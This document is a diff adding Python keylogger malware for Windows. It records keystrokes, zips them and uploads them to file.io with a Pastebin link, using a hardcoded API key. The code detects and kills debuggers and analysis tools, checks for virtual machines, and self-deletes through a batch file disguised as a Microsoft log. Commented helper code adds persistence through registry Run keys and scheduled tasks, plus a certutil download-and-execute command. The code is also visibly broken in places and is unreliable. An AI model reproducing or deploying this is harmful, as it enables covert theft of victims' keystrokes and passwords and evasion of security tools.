@@ -1,0 +1,454 @@
+#/usr/bin/env python
+# -*- coding:utf-8 -*-
+import os
+import sys
+import wmi
+import time
+import psutil
+import subprocess
+
+import threading
+
+from ctypes import *
+from zipfile import *
+from pyupload.uploader import * # Setup for this lib appears compatible with Py2 
+from datetime import datetime as dt
+
+from pastebin_python import PastebinPython
+from pastebin_python.pastebin_exceptions import *
+from pastebin_python.pastebin_constants import *
+from pastebin_python.pastebin_formats import *
+
+Debug = False
+DBG   = False
+VM    = False
+
+pbin  = PastebinPython(api_dev_key='feab72ec4bfc99b4e7b611055c7e970f') 
+
+name     = sys.argv[0]
+location = os.abspath(name)
+
+"""
+We prepare a keymap to utilize with the
+ctypes module in order to log keystrokes
+"""
+VKStr = {}
+VKStr[0x01] = "LEFT_MOUSEE"
+VKStr[0x02] = "RIGHT_MOUSE"
+VKStr[0x03] = "MIDDLE_MOUSE"
+VKStr[0x08] = "BACKSPACE"
+VKStr[0x09] = "TAB"
+VKStr[0x0D] = "ENTER"
+VKStr[0x10] = "SHIFT"
+VKStr[0x11] = "CTRL"
+VKStr[0x12] = "ALT"
+VKStr[0x14] = "CAPSLOCK"
+VKStr[0x18] = "ESCAPE"
+VKStr[0x20] = " "
+VKStr[0x25] = "LEFT_ARROW"
+VKStr[0x26] = "UP_ARROW"
+VKStr[0x27] = "RIGHT_ARROW"
+VKStr[0x28] = "DOWN_ARROW"
+VKStr[0x2C] = "PRINT_SCREEN"
+VKStr[0x30] = "0"
+VKStr[0x31] = "1"
+VKStr[0x32] = "2"
+VKStr[0x33] = "3"
+VKStr[0x34] = "4"
+VKStr[0x35] = "5"
+VKStr[0x36] = "6"
+VKStr[0x37] = "7"
+VKStr[0x38] = "8"
+VKStr[0x39] = "9"
+VKStr[0x41] = "a"
+VKStr[0x42] = "b"
+VKStr[0x43] = "c"
+VKStr[0x44] = "d"
+VKStr[0x45] = "e"
+VKStr[0x46] = "f"
+VKStr[0x47] = "g"
+VKStr[0x48] = "h"
+VKStr[0x49] = "i"
+VKStr[0x4A] = "j"
+VKStr[0x4B] = "k"
+VKStr[0x4C] = "l"
+VKStr[0x4D] = "m"
+VKStr[0x4E] = "n"
+VKStr[0x4F] = "o"
+VKStr[0x50] = "p"
+VKStr[0x51] = "q"
+VKStr[0x52] = "r"
+VKStr[0x53] = "s"
+VKStr[0x54] = "t"
+VKStr[0x55] = "u"
+VKStr[0x56] = "v"
+VKStr[0x57] = "w"
+VKStr[0x58] = "x"
+VKStr[0x59] = "y"
+VKStr[0x5A] = "z"
+
+ShiftEquivs={}
+ShiftEquivs[0x30] = ")"
+ShiftEquivs[0x31] = "!"
+ShiftEquivs[0x32] = "\""
+ShiftEquivs[0x33] = "£"
+ShiftEquivs[0x34] = "$"
+ShiftEquivs[0x35] = "%"
+ShiftEquivs[0x36] = "^"
+ShiftEquivs[0x37] = "&"
+ShiftEquivs[0x38] = "*"
+ShiftEquivs[0x39] = "("
+
+ActiveKeys = {}
+
+def cmdline(command):
+    process = subprocess.Popen(
+        args=command,
+        stdout=subprocess.PIPE,
+        shell=True)
+
+    return process.communicate()[0]
+"""
+Here we have some anti-forensic measures.
+
+We will assign points for types of obstacles we may come across.
+We check for debugger processes, OS uptime, drive size among other
+things in order to try to figure out wether we are being executed
+in a VM or potentially being debugged or at risk of those things
+Then we simply add up the points and act according to our risk score
+"""
+def risk():
+	risk_score = 0
+
+	# Check uptime
+	uptime_sec    = time.time() - psutil.boot_time()
+	uptime_minute = uptime_sec * 60
+	uptime_hour   = uptime_minute * 60
+
+	# Tally risk score
+	if uptime_hour < 1:
+		risk_score += 5
+
+	# Clock
+	ran_int = random.randint(1,21)*5
+	time.sleep(ran_int)
+
+	# Disk Size
+	# with os.statvfs, we need to multiply block sizes by block counts to get bytes
+	stats = os.statvfs(path)
+	total = stats.f_frsize * stats.f_blocks
+	free  = stats.f_frsize * stats.f_bavail
+
+	total_mb   = total * 100 # Calculates from bytes to Mb
+	total_free = free * 100
+
+	disk_usage ={ "total": total,
+				  "free" : free,
+				  "used" : total - free, }
+
+	# Tally risk score
+	if total_free < 40:
+		risk_score += 5
+
+	# Clock
+	ran_int = random.randint(1,21)*5
+	time.sleep(ran_int)
+
+
+    # Anti VM
+	VMProcessList = ["vmsrvc.exe", "vmware.exe","vbox.exe",
+		"vmvss.exe","vmscsi.exe","vmhgfs.exe","vboxservice.exe",
+		"vmxnet.exe","vmx_svga.exe","vmmemctl.exe",
+		"autoruns.exe","autorunsc.exe","vmusbmouse.exe","vmtools.exe",
+		"regmon.exe","vboxtray.exe", "vmrawdsk.exe","joeboxcontrol.exe",
+		"joeboxserver.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe",
+		"vmusrvc.exe","xenservice.exe"]
+
+    # Debug proc check
+	DebugList = ["ollydbg.exe","ProcessHacker.exe", "fiddler.exe",
+		"tcpview.exe","df5serv.exe", "filemon.exe","procmon.exe","regmon.exe",
+		"procexp.exe","idaq.exe","idaq64.exe","ImmunityDebugger.exe","Wireshark.exe",
+		"dumpcap.exe","HookExplorer.exe","ImportREC.exe","PETools.exe","LordPE.exe",
+		"SysInspector.exe","proc_analyzer.exe","sysAnalyzer.exe","sniff_hit.exe","windbg.exe",
+		"prl_cc.exe","prl_tools.exe","xenservice.exe"]
+
+	DBG_out = []
+
+	for proc in psutil.process_iter():
+		if proc.name() in DebugList:
+			#print(proc)
+			DBG = True
+
+			try:
+				p = psutil.Process(proc.pid)
+				time.sleep(0.33)
+				p.kill()
+			except Exception as e:
+				#print e
+				DBG_out.append(proc)
+				continue
+
+		elif proc.name() in VMProcessList:
+			#print(proc)
+			VM = True
+
+			continue
+
+	"""
+	If there were DBG procs check to see
+	if we managed to kill them all by counting
+	the number of items in the DBG_out array
+
+	In case it's empty assume we killed all
+	and switch DBG back to False
+	"""
+	cnt = 0
+	for i in DBG_out:
+		cnt += 1
+
+	if not cnt < 1:
+		DBG = False
+
+	if DBG and VM == True:
+		risk_score += 15
+		return risk_score
+
+	elif DBG == True:
+		risk_score += 12
+		return risk_score
+
+	elif VM == True:
+		risk_score += 11
+		return risk_score
+
+	else:
+		return risk_score
+
+"""
+Main logger logic starts here
+"""
+class Thread():
+    def __init__(self, addressOf, args):
+        self.terminate = False
+        self.Instance = threading.Thread(target=addressOf, args=args)
+        self.Instance.daemon = True
+        self.Instance.start()
+
+def StringToVK(string):
+    for key, value in VKStr.items():
+        if value == string:
+            return key
+
+def VKToString(VK):
+    return VKStr[VK]
+
+def IsKeyPressed(VK_KEYCODE):
+    if type(VK_KEYCODE) == str:
+        try:
+            VK_KEYCODE = StringToVK(VK_KEYCODE)
+        except Exception as e:
+			if debug:
+				e = "Exception caught in sub: 'IsKeyPressed' arg VK_KEYCODE is invalid"
+				sys.exit(e)
+            return
+
+    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x8000 != 0
+
+def IsKeyToggled(VK_KEYCODE):
+    return windll.user32.GetKeyState(c_int(VK_KEYCODE)) & 0x0001 != 0
+
+class KeyTracker:
+    def __init__(self):
+        self.tracking = False
+        self.tracked_string_concat = ""
+        self.file_open = False
+
+    def StartTracking(self):
+        self.tracking = True
+
+    def StopTracking(self):
+        self.tracking = False
+        self.CompileData()
+
+    def KeyDown(self, key):
+        if self.tracking and VKToString(key) != "SHIFT":
+            if IsKeyToggled(StringToVK("CAPSLOCK")):
+                self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
+            elif IsKeyPressed(StringToVK("SHIFT")):
+                shiftEquiv = False
+                try:
+                    ShiftEquivs[key]
+                    shiftEquiv = True
+                except:
+                    pass
+
+                if shiftEquiv:
+                    self.tracked_string_concat = self.tracked_string_concat + ShiftEquivs[key]
+                else:
+                    self.tracked_string_concat = self.tracked_string_concat + VKToString(key).upper()
+            else:
+                self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
+
+    def KeyUp(self, key):
+        if self.tracking and VKToString(key) == "SHIFT":
+            #self.tracked_string_concat = self.tracked_string_concat + VKToString(key)
+            pass
+
+    def UpdateKeyState(self, key, state):
+
+		def SetKeyState(key, state):
+            ActiveKeys[key] = state
+            if state == True:
+                self.KeyDown(key)
+            elif state == False:
+                self.KeyUp(key)
+
+        keyExists = False
+        try:
+            ActiveKeys[key]
+            keyExists = True
+        except:
+            pass
+
+        if keyExists:
+            if ActiveKeys[key] != state:
+                SetKeyState(key, state)
+        else:
+            SetKeyState(key, state)
+
+    def CompileData(self):
+		outfile = open("data.txt", "a")
+        outfile.write("\n")
+        outfile.write("-"*15)
+        outfile.write("\n")
+        outfile.write(self.tracked_string_concat)
+        
+        
+        with ZipFile("data.zip", "w") as zip:
+			zip.write(outfile)
+			outfile.close()
+			
+			url = upload('fileio', 'data.zip') 
+			result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
+			
+         
+    def TrackData(self, time_length): # Time in seconds
+        KeyTracker.StartTracking()
+        time.sleep(time_length)
+        KeyTracker.StopTracking()
+"""
+Main logger logic ends here.
+"""
+
+
+# Start block
+def start():
+
+	KeyTracker = KeyTracker()
+	t = Thread(KeyTracker.TrackData, [5])
+
+	while True:
+		for key, key_name in VKStr.items():
+			KeyTracker.UpdateKeyState(key, IsKeyPressed(key))
+
+
+def selfdestruct():
+    filename = executable.split("\\")[-1]
+    data = '''@echo off
+REM Microsoft(tm) --- SysMon task log
+
+TASKKILL /F /IM "{0}"
+break>{0}
+DEL -f "{0}"
+break>"%~f0" && DEL "%~f0"
+
+REM EOF --- End Of File
+
+echo sysmon >> {0}'''.format( filename )
+    f = open("sysmon.bat","w")
+    f.write(data)
+    f.close()
+    cmdline("sysmon.bat >> NUL")
+
+if __name__ == "__main__":
+	risk = risk()
+	if risk == 25:
+		# All checks report risk
+		# Restricted: Terminate
+		selfdestruct()
+	elif risk == 17:
+		# Flag for DBG proc, flag for VM indicator
+		# Restricted: Terminate
+		selfdestruct()
+	elif risk == 16:
+		# Flag for VM proc, flag for VM indicator
+		# Restricted: Terminate.
+		selfdestruct()
+	elif risk == 10:
+		# Two VM indicator flags
+		# Moderate risk: User Discretion
+		# selfdestruct()
+	elif risk == 5:
+		# One VM indicator
+		# Low risk: User Discretion
+		# selfdestruct()
+	else risk == 0:
+		# No indicators
+		# Of course, this just means we were unable
+		# To find indicators, not that we are 100% safe.
+		start()
+
+
+"""
+'''
+certutil -decode encoded_attack.crt encoded.exe
+'''
+
+# Helper Scripts
+def SelfDestruct(which=''):
+
+	task  = "REM Microsoft(tm) --- Security Essentials"
+	task += "@ECHO OFF"
+	task += ""
+	task += "mkdir %TEMP%\mcache"
+	task += "mkdir %APPDATA%\WinHelper"
+	task += ""
+	task += REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d '%TEMP%\mcache\' + name
+	task += REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "Windows.NET service" /t REG_SZ /f /d '%APPDATA%\WinHelper\{0}' + name
+	task += ""
+	task += "schtasks /create /tn 'Windows .NET Services' /tr %TEMP%\mcache\{0} /sc onstart /ru System".format
+	task += "schtasks /create /tn 'Windows .NET Services' /tr %APPDATA%\WinHelper\{0} /sc onstart /ru System".format
+
+
+	crt  = "REM Microsoft(tm) --- Security Essentials"
+	crt += "@ECHO OFF"
+	crt += "certutil -urlcache -split -f {0} data0.bat && start /b cmd.exe /c data0.bat".format(link)
+	crt += "certutil -decode encoded_attack.crt encoded.exe"
+
+
+
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run ("C:\Users\jny\Desktop\Keylogger\logger.exe"), 0, False
+
+Set WshShell = Nothing
+
+
+# %windir%\System32
+
+
+# -*- coding:utf-8 -*-
+
+import socket,thread
+
+address = ('127.0.0.1', 1234)
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(address)
+def log_data(data):
+    print data
+while True:
+    data, addr = s.recvfrom(1024)
+    thread.start_new_thread(log_data, (data,))
+
+
+s.close()
+"""
